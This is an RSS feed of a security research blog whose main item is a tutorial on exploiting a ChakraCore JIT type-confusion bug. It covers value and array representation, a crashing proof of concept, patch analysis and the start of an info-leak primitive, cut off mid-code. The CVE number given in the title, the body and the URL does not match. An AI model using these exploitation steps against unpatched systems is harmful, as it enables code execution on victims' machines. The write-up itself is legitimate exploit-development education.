<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ExEcc0dE's blog</title><link>https://execc0de.github.io/</link><description>Recent content on ExEcc0dE's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 20 Oct 2024 22:50:50 +0200</lastBuildDate><atom:link href="https://execc0de.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Archives</title><link>https://execc0de.github.io/archives/</link><pubDate>Sun, 20 Oct 2024 22:50:50 +0200</pubDate><guid>https://execc0de.github.io/archives/</guid><description/></item><item><title>About</title><link>https://execc0de.github.io/about/</link><pubDate>Sun, 20 Oct 2024 22:50:41 +0200</pubDate><guid>https://execc0de.github.io/about/</guid><description>&lt;p>Hi! This is &lt;a class="link" href="https://x.com/reubensammut" target="_blank" rel="noopener"
>Reuben&lt;/a> and &lt;a class="link" href="https://x.com/f00fc7c800" target="_blank" rel="noopener"
>Vlad&lt;/a>, and we are ExEcc0dE. Here, we&amp;rsquo;re documenting our journeys in exploit development and security research.&lt;/p>
&lt;p>Our socials are in the menu on the left. Feel free to get in touch with us.&lt;/p></description></item><item><title>Exploiting CVE-2018-3048 for arbitrary code execution</title><link>https://execc0de.github.io/posts/cve-2018-3408/</link><pubDate>Sun, 20 Oct 2024 20:59:47 +0200</pubDate><guid>https://execc0de.github.io/posts/cve-2018-3408/</guid><description>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/titleimage.png" alt="Featured image of post Exploiting CVE-2018-3048 for arbitrary code execution" />&lt;p>This post will cover our journey (Vlad and Reuben&amp;rsquo;s) into the analysis of CVE-2018-0834, a ChakraCore JavaScript engine vulnerability discovered by LokiHardt, and how we exploited the vulnerability in order to get arbitrary code execution.&lt;/p>
&lt;h2 id="chakra-internals">Chakra internals
&lt;/h2>&lt;h3 id="number-representation">Number representation
&lt;/h3>&lt;p>Before we dive into exploiting this vulnerability, we need to understand how ChakraCore handles values and objects. First off, we&amp;rsquo;ll look into number representation in JavaScript. Generally speaking, numbers can either be represented as integers or 64-bit floating point numbers.
Let&amp;rsquo;s start by looking at integers. Consider the following snippet:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x41414141&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When it comes to the internal representation of numbers in memory, ChakraCore uses the upper 17 bits to encode the type information. For integers, the number is XORed with 0x0001000000000000. Thus, the above example of the integer 0x41414141, is represented as 0x0001000041414141.&lt;/p>
&lt;p>Due to the nature of ChakraCore integer representation, it&amp;rsquo;s not possible to use arbitrary 64-bit integers. The highest possible number which can be represented in ChakraCore is 0x7FFFFFFFFFFF. Luckily for us, valid userland addresses range from 0 to 0x7FFFFFFFFFFF, meaning that, for exploitation purposes, this is enough to cover all valid userland addresses.&lt;/p>
&lt;p>One important aspect to note about ChakraCore, is that it always treats numbers as signed. As a simple example, if we take the value 0x7f, where the most significant bit is 0, the number is treated as the positive integer 127. Conversely, the value 0x80, has its most significant bit set to 1, thus, the number is treated as the negative integer -128, rather than the actual value of 128. This could cause issues when we&amp;rsquo;re working with exploits. To counteract this issue, we add 0x100 to the negative value to arrive to the correct number representation, where in this case we would add 256 to -128 to arrive to the correct value of 128. The same technique can be applied to larger numbers such as 32-bit integers. As we go through the exploit, we&amp;rsquo;ll encounter a helper function being used, which does just that. This function is called &lt;code>SignedDwordToUnsignedDword&lt;/code>.&lt;/p>
&lt;p>Having familiarised oursevles with the integer representation, let&amp;rsquo;s inspect the floating point number representation. Floating point numbers are represented using the IEEE 754 standard, where the number is split into the sign, exponent and fraction parts as follows.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Sign&lt;/th>
&lt;th>Exponent&lt;/th>
&lt;th>Fraction&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1 bit(63)&lt;/td>
&lt;td>11 bits(62-52)&lt;/td>
&lt;td>52 bits(51-0)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Floating point numbers are also encoded with the type information. In ChakraCore, this is done by XORing them with 0xFFFC000000000000.&lt;/p>
&lt;h3 id="array-representation">Array representation
&lt;/h3>&lt;p>Next we will be addressing yet another traditional JavaScript object which is the array. Let&amp;rsquo;s investigate how they are represented in memory. Take the following code snippet as an example:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Array(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This snippet simply creates an array. Looking at the array&amp;rsquo;s representation in the WinDbg debugger, we see the following as an example of a native integer array.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/nativeintarray.png"
width="983"
height="357"
srcset="https://execc0de.github.io/posts/cve-2018-3408/nativeintarray_hu6674963407175635540.png 480w, https://execc0de.github.io/posts/cve-2018-3408/nativeintarray_hu386494125069693254.png 1024w"
loading="lazy"
alt="Example of a native integer array in memory"
class="gallery-image"
data-flex-grow="275"
data-flex-basis="660px"
>&lt;/p>
&lt;p>To better understand the array&amp;rsquo;s representation shown above, the following diagram shows the memory layout to which the array object data can be mapped.&lt;/p>
&lt;script type="module">
import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
const lsTheme = localStorage.getItem("theme")
const hugoTheme = document.body.classList.contains("dark-theme") ? "dark" : null
const currTheme = lsTheme ? lsTheme : hugoTheme;
const mermaidTheme = currTheme == "light" ? "default" : "dark"
mermaid.initialize({theme: mermaidTheme});
&lt;/script>
&lt;div class="mermaid" style="align-items:center">
block-beta
columns 3
vptr space:2
type space:2
auxSlots space:2
objectArray space:2
length space:2
head space:1 left
space:2 l["length"]
space:2 size
space:2 next
space:2 e0["Element[0]"]
space:2 e1["Element[1]"]
space:2 e2["..."]
space:2 e3["Element[n]"]
space:2 s["(Next Segment)"]
head --> left
&lt;/div>
&lt;p>While the layout of arrays in memory is not essential to understand for the purposes of exploiting this vulnerability, it is required to understand it when debugging.&lt;/p>
&lt;p>Across different JavaScript engines, we can typically find the following three types of arrays:&lt;/p>
&lt;ul>
&lt;li>&lt;code>JavascriptNativeIntArray&lt;/code>&lt;/li>
&lt;li>&lt;code>JavascriptNativeFloatArray&lt;/code>&lt;/li>
&lt;li>&lt;code>JavascriptArray&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>All of the three array types follow the layout shown above.&lt;/p>
&lt;p>Zooming in on &lt;code>JavascriptNativeFloatArray&lt;/code> and &lt;code>JavascriptNativeIntArray&lt;/code>, the array elements no longer contain the type information encoded since it&amp;rsquo;s implicit in the array type.&lt;/p>
&lt;p>Take as an example the following snippet:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5.40900888&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">315&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">5.40900888&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">315&lt;/span>];
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the variable &lt;code>x&lt;/code> above, the floating point number 5.40900888e-315 is represented in memory as 0xFFFC000041414141, however in &lt;code>y&lt;/code>, since the type is implicitly encoded in the &lt;code>JavascriptNativeFloatArray&lt;/code> array type, the value is no longer XORed with 0xFFFC000000000000, which makes the value in memory 0x0000000041414141.&lt;/p>
&lt;p>As the &lt;code>JavascriptArray&lt;/code> can contain any type of data, the concept of type encoding is reintroduced, with both integers and floats having their type encoded within the value in memory. Pointers to other objects or arrays within the &lt;code>JavascriptArray&lt;/code> are not encoded with type information.&lt;/p>
&lt;h2 id="triggering-the-vulnerability">Triggering the Vulnerability
&lt;/h2>&lt;p>In this section, we&amp;rsquo;ll develop an understanding of the code that triggers the vulnerability and observe its effects. Let&amp;rsquo;s start with the proof of concept code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2.3023&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">320&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, {});
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">arr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">main&lt;/span>();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the &lt;code>main&lt;/code> function, the &lt;code>opt&lt;/code> function gets called 10000 times with the same arguments. This will trigger JIT compilation and since we are passing the same arguments to the function, during optimisation, assumptions are made on the type of the function arguments. In the loop where we&amp;rsquo;re forcing the &lt;code>opt&lt;/code> function to be JITed, the arguments we supply are the array &lt;code>arr&lt;/code>, along with an empty object &lt;code>{}&lt;/code>.&lt;/p>
&lt;p>Inside the &lt;code>opt&lt;/code> function, a JSObject is created where the &lt;code>__proto__&lt;/code> property is set to the second argument. Due to JIT assumptions made during JITing of the &lt;code>opt&lt;/code> function, this will be expected to be a JSObject.&lt;/p>
&lt;p>Following this JIT compilation and execution, the loop is completed and execution returns to the interpreter. A final call is made to the &lt;code>opt&lt;/code> function, which violates the assumption of the argument types by specifying the array &lt;code>arr&lt;/code> as both first and second parameter. It is not directly clear what effect this will have, but we can observe it by executing the JavaScript code while attached to a debugger.&lt;/p>
&lt;p>To execute the above presented JavaScript code, we&amp;rsquo;ll save the above code in a &lt;code>.js&lt;/code> file, open a command prompt and start WinDbg Preview while debugging ChakraCore. To do this we execute the following command&lt;/p>
&lt;pre tabindex="0">&lt;code>windbgx ch.exe snipper.js
&lt;/code>&lt;/pre>&lt;p>Starting the debugging session, a default breakpoint is set at the entry point. When we let execution continue, we observe an access violation as can be seen below:&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/applicationcrash.png"
width="862"
height="176"
srcset="https://execc0de.github.io/posts/cve-2018-3408/applicationcrash_hu9484172435274885518.png 480w, https://execc0de.github.io/posts/cve-2018-3408/applicationcrash_hu2631369723755777759.png 1024w"
loading="lazy"
alt="Application crash in WinDbg"
class="gallery-image"
data-flex-grow="489"
data-flex-basis="1175px"
>&lt;/p>
&lt;p>The access violation is due to invalid memory access. Notice that the hexadecimal representation of the float 2.3023e-320 is 0x1234. This value was specifically chosen, since its hexadecimal representation can be very easily detected while debugging. In the above screenshot, we see that the violation is at the address 0x123c which happens to be 0x1234 + 8.&lt;/p>
&lt;h2 id="patch-analysis">Patch Analysis
&lt;/h2>&lt;p>One helpful step before jumping into the exploitation of a patched vulnerability, is to understand what changes have been made to fix said vulnerability. We&amp;rsquo;ll start by looking at the GitHub advisory for this CVE.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/cvegithubrepo.png"
width="1893"
height="957"
srcset="https://execc0de.github.io/posts/cve-2018-3408/cvegithubrepo_hu14812204258690258099.png 480w, https://execc0de.github.io/posts/cve-2018-3408/cvegithubrepo_hu13231627285505929313.png 1024w"
loading="lazy"
alt="CVE in GitHub repo"
class="gallery-image"
data-flex-grow="197"
data-flex-basis="474px"
>&lt;/p>
&lt;p>From the above image we notice that we were provided with a &lt;a class="link" href="https://github.com/chakra-core/ChakraCore/commit/6cd503299eac4a5b5ffc0c5bb0d072861f60e183" target="_blank" rel="noopener"
>link to the commit&lt;/a> in the ChakraCore repo which fixes this vulnerability. Opening the link shows us that the fix is contained within one commit.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/bugfix.png"
width="1072"
height="636"
srcset="https://execc0de.github.io/posts/cve-2018-3408/bugfix_hu4783399013193303835.png 480w, https://execc0de.github.io/posts/cve-2018-3408/bugfix_hu14385214049327797096.png 1024w"
loading="lazy"
alt="Commit with the bug fix"
class="gallery-image"
data-flex-grow="168"
data-flex-basis="404px"
>&lt;/p>
&lt;p>Let&amp;rsquo;s try to make some sense of this. First of all we see that the changes occured only in one file named &lt;code>GlobOpt.cpp&lt;/code>. Inspecting the file we find that the patched function is called &lt;code>CheckJsArrayKills&lt;/code>, as can be seen below&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/patchedfunction.png"
width="767"
height="242"
srcset="https://execc0de.github.io/posts/cve-2018-3408/patchedfunction_hu10281788374253719064.png 480w, https://execc0de.github.io/posts/cve-2018-3408/patchedfunction_hu15783628136127999651.png 1024w"
loading="lazy"
alt="Patched function"
class="gallery-image"
data-flex-grow="316"
data-flex-basis="760px"
>&lt;/p>
&lt;p>Going over the patch we see it adds a check for the case that the opcode is &lt;code>InitProto&lt;/code>, which means that an array has been set as a prototype.&lt;/p>
&lt;p>Analysing the code that was added in this check, the change boils down to calling &lt;code>kills.SetKillsNativeArrays()&lt;/code> when the array being used is a native array such as a &lt;code>JavascriptNativeFloatArray&lt;/code>. This function sets a flag which is then used within the &lt;code>ProcessValueKills&lt;/code> function.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/killsnativearrays.png"
width="923"
height="386"
srcset="https://execc0de.github.io/posts/cve-2018-3408/killsnativearrays_hu6316161419878458328.png 480w, https://execc0de.github.io/posts/cve-2018-3408/killsnativearrays_hu2510447745200089621.png 1024w"
loading="lazy"
alt="Array data invalidation in case the KillsNativeArrays flag is set"
class="gallery-image"
data-flex-grow="239"
data-flex-basis="573px"
>&lt;/p>
&lt;p>The relevant code in this function essentially invalidates the array data when the &lt;code>KillsNativeArrays&lt;/code> flag is set, such as when a native array is used as a prototype.&lt;/p>
&lt;h2 id="exploiting-type-confusion">Exploiting Type Confusion
&lt;/h2>&lt;h3 id="infoleak">InfoLeak
&lt;/h3>&lt;p>As we&amp;rsquo;ve seen in the previous sections, the issue lies in the assumption being made by the optimiser in the JIT compiler. When the float array is used as a prototype, it should be converted from a &lt;code>JavascriptNativeFloatArray&lt;/code> to a &lt;code>JavascriptVarArray&lt;/code>. As the prototype is always assumed to be an empty object, as was the case when we were calling the &lt;code>opt&lt;/code> function within the loop, the type change happens, but the array is not invalidated. We can use this bug to our advantage to get our first information leak. Let&amp;rsquo;s start by looking at the &lt;code>opt&lt;/code> function once again.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>; &lt;span style="color:#75715e">// [1]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>}; &lt;span style="color:#75715e">// [2]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2.3023&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">320&lt;/span>; &lt;span style="color:#75715e">// [3]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Please note that the lines within this function have been annotated with a number for easy reference within this section.&lt;/p>
&lt;p>In order to make the function JIT compiled, we start by calling the &lt;code>opt&lt;/code> function a large number of times with the same parameters.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, {});
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With these calls, the &lt;code>opt&lt;/code> function is JITed and the &lt;code>arr&lt;/code> parameter in &lt;code>opt&lt;/code> is assumed to be a native float array, while the &lt;code>proto&lt;/code> parameter is assumed to be an object.&lt;/p>
&lt;p>After the function has been JITed, we call the &lt;code>opt&lt;/code> function with the following parameters.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">arr&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the introductory section on arrays, we know that numbers in the float array do not contain the type information. This means that the float array passed to the &lt;code>opt&lt;/code> function will not have the upper 17 bits XORed with 0xFFFC. Let&amp;rsquo;s go through what happens in the &lt;code>opt&lt;/code> function, after it has been JITed.&lt;/p>
&lt;p>In &lt;code>[1]&lt;/code>, the first element of the native float array is set to 1.1. Going on to line &lt;code>[2]&lt;/code>, we see that the &lt;code>proto&lt;/code> parameter is used as a prototype. For normal objects such as &lt;code>{}&lt;/code>, this shouldn&amp;rsquo;t cause any issues, however, a Javascript native array should be converted to a &lt;code>JavascriptVarArray&lt;/code>. In our case, this conversion should cause native floats which do not contain the type information, to floats with type information. For the &lt;code>proto&lt;/code> parameter, this conversion does happen, however, the array data it contains is not invalidated. This means that in line &lt;code>[3]&lt;/code>, the &lt;code>arr&lt;/code> parameter is still treated as a native float array, so when assigning the value 2.3023e-320 (which has a memory representation of 0x1234 for ease of identification) to the first index in the array, the type information is not encoded. Since the conversion to &lt;code>JavascriptVarArray&lt;/code> happened, when we try to access the non-type encoded value, it will be treated as a pointer. As we saw earlier, accessing an object at 0x1234 is more than likely going to cause an access violation.&lt;/p>
&lt;p>So, how can we use this to our advantage? Let&amp;rsquo;s look at the following change in line &lt;code>[3]&lt;/code> in the &lt;code>opt&lt;/code> function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Array(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>; &lt;span style="color:#75715e">// [1]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>}; &lt;span style="color:#75715e">// [2]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>; &lt;span style="color:#75715e">// [3]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If in line &lt;code>[3]&lt;/code> we try to assign the &lt;code>fake_object&lt;/code> to the second element of the &lt;code>arr&lt;/code> parameter, the object is stored in the second element and if the conversion from a &lt;code>JavascriptNativeFloatArray&lt;/code> to a &lt;code>JavascriptVarArray&lt;/code> hadn&amp;rsquo;t happened, it would happen now. Subsequent access to the &lt;code>arr[1]&lt;/code> within this function, would just return the object stored.&lt;/p>
&lt;p>We know that the ChakraCore engine, when JITing functions, it makes assumptions based on the parameters it has seen over a number of calls. Let&amp;rsquo;s now consider adding a third parameter to the &lt;code>opt&lt;/code> function we&amp;rsquo;ll call &lt;code>arr2&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>, &lt;span style="color:#a6e22e">arr2&lt;/span>) { &lt;span style="color:#75715e">//*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>; &lt;span style="color:#75715e">// [1]
